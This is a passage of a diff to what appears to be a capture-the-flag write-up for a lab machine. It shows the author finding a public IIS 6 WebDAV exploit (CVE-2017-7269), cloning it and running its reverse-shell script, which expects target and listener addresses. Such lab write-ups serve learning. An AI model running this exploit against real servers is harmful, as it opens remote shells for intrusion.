@@ -65,6 +65,46 @@ Going back to the nmap scan I found this
 
 It seems that version of ```Microsoft IIS httpd``` has an exploit
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dd310ad-45ad-4604-9992-4f5561b5a543)
+
+Yeah I was right. Now that we found our attack vector, lets exploit😎
+
+
+
+# Exploitation
+
+During the search for exploits I found [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
+
+You can just clone it, so you'll be able to use  it
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny]
+└─$ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git
+Cloning into 'iis6-exploit-2017-CVE-2017-7269'...
+remote: Enumerating objects: 6, done.
+remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
+Receiving objects: 100% (6/6), done.
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny]
+└─$ cd iis6-exploit-2017-CVE-2017-7269 
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny/iis6-exploit-2017-CVE-2017-7269]
+└─$ ls -la         
+total 32
+drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .
+drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  ..
+drwxr-xr-x 8 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .git
+-rw-r--r-- 1 bl4ck4non bl4ck4non 12313 Sep 20 17:15 'iis6 reverse shell'
+-rw-r--r-- 1 bl4ck4non bl4ck4non    66 Sep 20 17:15  README.md
+```
+Lets try to run the exploit
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Granny/iis6-exploit-2017-CVE-2017-7269]
+└─$ python2 iis6\ reverse\ shell             
+usage:iis6webdav.py targetip targetport reverseip reverseport
+```
+So, we have to specify the targetip and targetport, also our tun0 ip address and the port we plan on listening on
 
 
 
